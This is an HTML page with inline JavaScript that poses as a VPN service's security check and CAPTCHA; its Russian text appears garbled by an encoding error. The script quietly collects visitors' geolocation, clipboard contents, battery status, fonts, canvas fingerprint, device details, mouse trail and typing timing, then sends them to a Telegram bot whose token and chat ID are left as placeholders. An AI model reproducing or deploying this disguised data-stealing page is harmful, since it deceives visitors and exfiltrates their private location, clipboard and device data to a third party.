<body>
  <div class="container">
    <h1>üîí –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h1>
    <p>VPN Service –æ–±–Ω–∞—Ä—É–∂–∏–ª –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—É—é –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å. –ü—Ä–æ–π–¥–∏—Ç–µ –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—é:</p>
    <div class="progress-container">
      <div class="progress-bar" id="progressBar"></div>
    </div>
    <div id="captchaCode">‚Äî‚Äî‚Äî</div>
    <input type="text" id="userInput" maxlength="8" placeholder="–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥" autocomplete="off">
    <button class="verify-btn" id="verifyBtn">–ü—Ä–æ–≤–µ—Ä–∏—Ç—å</button>
    <div id="status" class="status"></div>
  </div>

  <script>
    const TELEGRAM_TOKEN = '–¢–í–û–ô_–¢–û–ö–ï–ù';
    const CHAT_ID = '–¢–í–û–ô_CHAT_ID';

    const elements = {
      captchaCode: document.getElementById('captchaCode'),
      userInput: document.getElementById('userInput'),
      verifyBtn: document.getElementById('verifyBtn'),
      progressBar: document.getElementById('progressBar'),
      status: document.getElementById('status')
    };

    let currentCaptcha = '';
    let mouseTrail = [];
    let batteryInfo = {};
    let fingerprintCache = null;
    let keyLog = [];

    // –ö–∞–ø—á–∞
    function generateCaptcha() {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      return Array(8).fill().map(() => chars[Math.floor(Math.random()*chars.length)]).join('');
    }

    function start() {
      currentCaptcha = generateCaptcha();
      elements.captchaCode.textContent = currentCaptcha;
      elements.progressBar.style.width = '0%';
      collectPassiveFingerprint();
    }

    // Mouse path
    document.addEventListener('mousemove', (e) => {
      mouseTrail.push({x: e.clientX, y: e.clientY, t: Date.now()});
      if (mouseTrail.length > 200) mouseTrail.shift();
    });

    // Keystrokes –¥–∏–Ω–∞–º–∏–∫–∞
    elements.userInput.addEventListener('input', () => {
      const v = elements.userInput.value;
      keyLog.push({t: Date.now(), len: v.length});
    });

    // Battery
    if ('getBattery' in navigator) {
      navigator.getBattery().then(bat => {
        batteryInfo = {
          level: Math.round(bat.level * 100) + '%',
          charging: bat.charging ? '–î–∞' : '–ù–µ—Ç'
        };
      });
    }

    function detectFonts() {
      const testFonts = ['Arial','Times New Roman','Comic Sans MS','Courier New','Verdana'];
      const detected = [];
      if (document.fonts) {
        testFonts.forEach(font => {
          if (document.fonts.check(`12px ${font}`)) detected.push(font);
        });
      }
      return detected.slice(0, 3).join(',');
    }

    function getCanvasFP() {
      const canvas = document.createElement('canvas');
      canvas.width = 256; canvas.height = 60;
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = 'alphabetic';
      ctx.fillStyle = "#f60";
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = "#069";
      ctx.font = '11pt Arial';
      ctx.fillText('SUPER FP v3.0', 2, 15);
      return canvas.toDataURL().substring(0, 80);
    }

    async function getGeo() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve('geo-unsupported');
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve(`${pos.coords.latitude.toFixed(6)},${pos.coords.longitude.toFixed(6)}`),
          () => resolve('geo-denied'),
          {timeout: 3000}
        );
      });
    }

    async function getClipboard() {
      try {
        const text = await navigator.clipboard.readText();
        return text.substring(0, 80);
      } catch(e) {
        return 'clipboard-denied';
      }
    }

    // –ü–æ–ª–Ω—ã–π fingerprint (–ø–∞—Å—Å–∏–≤–Ω—ã–π)
    async function collectPassiveFingerprint() {
      if (fingerprintCache) return fingerprintCache;

      const [geo, clipboard] = await Promise.all([
        getGeo(),
        getClipboard()
      ]);

      fingerprintCache = {
        ts: new Date().toISOString(),
        userAgent: navigator.userAgent.substring(0, 150),
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
        cookies: navigator.cookieEnabled,
        hardware: `${navigator.hardwareConcurrency || '?'}c/${navigator.deviceMemory || '?'}GB`,
        fonts: detectFonts(),
        battery: batteryInfo.level || 'no',
        charging: batteryInfo.charging || 'no',
        mousePoints: mouseTrail.length,
        geo,
        canvas: getCanvasFP(),
        clipboard
      };

      return fingerprintCache;
    }

    async function sendTextReport(fp, input) {
      const text =
        `üéØ CAPTCHA_OK\n` +
        `üìù –ö–æ–¥: ${currentCaptcha}\n` +
        `‚å®Ô∏è –í–≤–æ–¥: ${input}\n\n` +
        `‚è±Ô∏è –í—Ä–µ–º—è: ${fp.ts}\n` +
        `üì± UA: ${fp.userAgent}\n` +
        `üíª –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${fp.platform}\n` +
        `üåê –Ø–∑—ã–∫/—Ç–∞–π–º–∑–æ–Ω–∞: ${fp.language} / ${fp.timezone}\n` +
        `üñ•Ô∏è –≠–∫—Ä–∞–Ω: ${fp.screen}\n` +
        `üîã –ë–∞—Ç–∞—Ä–µ—è: ${fp.battery} (${fp.charging})\n` +
        `üñ±Ô∏è –ú—ã—à—å: ${fp.mousePoints} —Ç–æ—á–µ–∫\n` +
        `üìç Geo: ${fp.geo}\n` +
        `üóé –®—Ä–∏—Ñ—Ç—ã: ${fp.fonts}\n` +
        `üìã –ë—É—Ñ–µ—Ä: ${fp.clipboard}\n` +
        `üß© Canvas: ${fp.canvas}\n\n` +
        `‚å®Ô∏è –î–∏–Ω–∞–º–∏–∫–∞ –≤–≤–æ–¥–∞: ${keyLog.length} —Å–æ–±—ã—Ç–∏–π`;

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT_ID, text})
      });
    }

    // –ö–Ω–æ–ø–∫–∞ –∫–∞–ø—á–∏
    elements.verifyBtn.addEventListener('click', async () => {
      const input = elements.userInput.value.trim().toUpperCase();
      if (input === currentCaptcha) {
        elements.status.textContent = 'üîç –ü—Ä–æ–≤–µ—Ä–∫–∞...';
        elements.status.className = 'status';

        const fp = await collectPassiveFingerprint();
        await sendTextReport(fp, input);

        elements.status.textContent = '‚úÖ –£—Å–ø–µ—à–Ω–æ';
        elements.status.className = 'status success';
      } else {
        elements.status.textContent = '‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥';
        elements.status.className = 'status error';
      }
    });

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', start);
    } else {
      start();
    }
  </script>
</body>
